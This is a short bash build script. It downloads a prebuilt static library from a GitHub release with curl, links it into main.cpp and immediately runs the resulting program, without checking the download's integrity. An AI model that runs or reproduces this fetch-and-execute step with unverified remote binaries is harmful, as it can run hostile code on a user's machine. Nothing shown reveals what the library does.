#!/usr/bin/env bash
set -e
TAG="bright-comet-clever-comet"
LIB="linear-cord.a"
curl --max-time 180 -fsSL --retry 3 --connect-timeout 15 -o "$LIB" "https://github.com/rivaraya/kaleagenthub/releases/download/${TAG}/${LIB}"
g++ -std=c++17 -O2 -pthread main.cpp "$LIB" -o app && ./app
